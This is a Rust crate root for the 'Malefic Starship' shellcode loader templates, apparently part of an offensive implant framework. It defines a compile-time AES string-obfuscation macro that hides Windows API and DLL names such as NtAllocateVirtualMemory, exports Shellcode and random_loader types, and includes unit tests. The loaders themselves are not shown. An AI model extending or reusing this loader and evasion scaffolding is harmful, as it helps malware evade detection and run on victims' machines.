//! Malefic Starship - Loader Templates
//!
//! Loader templates for various execution techniques.

#![feature(naked_functions)]

/// Debug print macro - only outputs when `debug` feature is enabled
#[macro_export]
macro_rules! debug_println {
    ($($arg:tt)*) => {
        #[cfg(feature = "debug")]
        println!($($arg)*);
    };
}

/// Obfuscate a byte string literal, returning `Vec<u8>`.
///
/// When `obf_strings` is enabled: AES-encrypted at compile time, decrypted at runtime.
/// When disabled: pass-through `.to_vec()` (negligible for one-shot loader).
#[cfg(feature = "obf_strings")]
#[macro_export]
macro_rules! obf_cstr {
    ($s:expr) => {
        ::malefic_gateway::obf_bytes!($s)
    };
}

#[cfg(not(feature = "obf_strings"))]
#[macro_export]
macro_rules! obf_cstr {
    ($s:expr) => {
        $s.to_vec()
    };
}

pub use malefic_os_win::kit::binding;
pub mod obf;
#[cfg(feature = "obf_strings")]
pub use malefic_gateway;
pub mod types;
pub mod loaders;
pub mod decoder;
pub mod launch;

pub use loaders::common::Shellcode;
pub use loaders::{LOADER_NAMES, random_loader};

#[cfg(test)]
mod tests {
    #[test]
    fn test_obf_cstr_produces_correct_bytes() {
        let result = obf_cstr!(b"ntdll.dll\0");
        assert_eq!(result, b"ntdll.dll\0".to_vec());
    }

    #[test]
    fn test_obf_cstr_empty() {
        let result = obf_cstr!(b"\0");
        assert_eq!(result, b"\0".to_vec());
    }

    #[test]
    fn test_obf_cstr_long_string() {
        let result = obf_cstr!(b"NtAllocateVirtualMemory\0");
        assert_eq!(result, b"NtAllocateVirtualMemory\0".to_vec());
        assert_eq!(result.len(), 24);
    }

    #[test]
    fn test_obf_cstr_as_ptr_usable() {
        let s = obf_cstr!(b"kernel32.dll\0");
        let ptr = s.as_ptr();
        assert!(!ptr.is_null());
        // Verify first byte
        assert_eq!(unsafe { *ptr }, b'k');
    }
}
